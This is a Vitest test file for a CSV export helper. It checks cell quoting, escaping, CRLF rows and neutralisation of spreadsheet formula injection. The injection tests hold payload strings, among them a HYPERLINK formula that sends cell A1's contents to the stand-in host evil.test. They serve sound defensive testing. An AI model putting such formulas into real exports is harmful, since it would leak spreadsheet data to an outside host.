import { describe, expect, it } from "vitest";

import { csvCell, toCsv } from "./csv";

describe("csvCell", () => {
  it("leaves ordinary values alone", () => {
    expect(csvCell("Flight BLR return")).toBe("Flight BLR return");
    expect(csvCell(18450)).toBe("18450");
  });

  it("renders null and undefined as empty", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
  });

  it("quotes cells containing a comma", () => {
    expect(csvCell("Hotel, 4 nights")).toBe('"Hotel, 4 nights"');
  });

  it("doubles embedded quotes", () => {
    expect(csvCell('He said "urgent"')).toBe('"He said ""urgent"""');
  });

  it("quotes cells containing newlines", () => {
    expect(csvCell("line one\nline two")).toBe('"line one\nline two"');
  });

  it("quotes cells with surrounding whitespace", () => {
    expect(csvCell("  padded  ")).toBe('"  padded  "');
  });

  // The reason this module exists rather than a join(",").
  describe("spreadsheet formula injection", () => {
    it.each(["=1+1", "+1", "-1", "@SUM(A1)"])("neutralises %s", (payload) => {
      expect(csvCell(payload)).toBe(`'${payload}`);
    });

    it("neutralises a hyperlink payload hidden in a report title", () => {
      const title = '=HYPERLINK("http://evil.test?c="&A1,"Click")';
      const cell = csvCell(title);
      expect(cell.startsWith(`"'=`)).toBe(true);
      // Still quoted, because the payload also contains commas and quotes.
      expect(cell).toContain('""');
    });

    it("does not touch a minus sign that is not leading", () => {
      expect(csvCell("Q3-2026 travel")).toBe("Q3-2026 travel");
    });
  });
});

describe("toCsv", () => {
  it("writes a header and CRLF-terminated rows", () => {
    const csv = toCsv(["Report", "Total"], [["Bengaluru client visit", "46870.00"]]);
    expect(csv).toBe("Report,Total\r\nBengaluru client visit,46870.00\r\n");
  });

  it("survives a title containing the delimiter", () => {
    const csv = toCsv(["Report"], [["Hotel, 4 nights"]]);
    expect(csv).toBe('Report\r\n"Hotel, 4 nights"\r\n');
  });

  it("emits only a header when there is nothing due", () => {
    expect(toCsv(["Report", "Total"], [])).toBe("Report,Total\r\n");
  });
});
